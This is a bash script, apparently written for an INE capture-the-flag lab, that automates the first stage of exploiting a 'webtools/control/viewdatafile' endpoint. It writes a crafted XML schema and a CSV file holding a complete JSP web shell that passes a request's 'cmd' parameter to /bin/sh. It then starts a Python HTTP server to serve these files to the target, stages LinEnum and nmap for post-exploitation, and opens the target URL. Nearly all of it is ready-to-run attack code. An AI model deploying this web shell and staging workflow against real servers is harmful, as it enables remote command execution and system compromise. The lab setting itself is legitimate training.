#!/bin/bash

# This is a simple script to automate the first part of the INE CTF.
# By: Squxlch-Sec TH3-N3TD3F3ND3R5

# Step 1: Create three files on /root/Desktop with the specified content

# Create rceschema.xml
echo "Creating rceschema.xml..."
cat <<EOF > /root/Desktop/rceschema.xml

<data-files>
	<data-file name="rce" separator-style="fixed-length" type-code="text" start-line="0" encoding-type="UTF-8">
		<record name="rceentry" limit="many">
			<field name="jsp" type="String" length="605" position="0"></field>
		</record>
	</data-file>
</data-files>
EOF

# Create rcereport.csv
echo "Creating rcereport.csv..."
cat <<EOF > /root/Desktop/rcereport.csv
<%@ page import='java.io.*' %><%@ page import='java.util.*' %><h1>Ahoy!</h1><br><% String getcmd = request.getParameter("cmd"); if (getcmd != null) { out.println("Command: " + getcmd + "<br>"); String cmd1 = "/bin/sh"; String cmd2 = "-c"; String cmd3 = getcmd; String[] cmd = new String[3]; cmd[0] = cmd1; cmd[1] = cmd2; cmd[2] = cmd3; Process p = Runtime.getRuntime().exec(cmd); OutputStream os = p.getOutputStream(); InputStream in = p.getInputStream(); DataInputStream dis = new DataInputStream(in); String disr = dis.readLine(); while ( disr != null ) { out.println(disr); disr = dis.readLine();}} %>,
EOF

# Create webserver.py
echo "Creating webserver.py..."
cat <<EOF > /root/Desktop/webserver.py
# SQUXLCH-SEC SIMPLE PYTHON WEB SERVER
# created by: Squxlch-Sec / TheNetDefenders

from http.server import SimpleHTTPRequestHandler, HTTPServer

# Define the server address and port
host = "0.0.0.0"  # Bind to all interfaces
port = 9999         # HTTP server port

# Create a request handler and HTTP server
class MyRequestHandler(SimpleHTTPRequestHandler):
    # To-Do: override methods to customize responses
    pass

def run_server():
    try:
        server_address = (host, port)
        httpd = HTTPServer(server_address, MyRequestHandler)
        print(f"Serving HTTP on {host} port {port} (http://{host}:{port}/)...")
        httpd.serve_forever()
    except Exception as e:
        print(f"Error: {e}")
    except KeyboardInterrupt:
        print("\nServer stopped.")
        httpd.server_close()

if __name__ == "__main__":
    run_server()
EOF

# Step 2: Copy files to the Desktop
echo "Copying required files to /root/Desktop..."
cp /root/Desktop/tools/LinEnum/LinEnum.sh /root/Desktop/
cp /root/Desktop/tools/portable/nmap/nmap /root/Desktop/
cp /root/Desktop/tools/portable/nmap/nmap-payloads /root/Desktop/
cp /root/Desktop/tools/portable/nmap/nmap-services /root/Desktop/

# Step 3: Run the webserver.py script
echo "Starting webserver.py on port 9999..."
nohup python3 /root/Desktop/webserver.py > /dev/null 2>&1 &

# Step 4: Open Firefox and navigate to the specified URL
echo "Opening Firefox to navigate to the target URL..."
firefox "https://target.ine.local:8443/webtools/control/viewdatafile" &

echo "All tasks completed successfully! Happy Hacking!! - TH3_N3T_D3F3ND3R5"
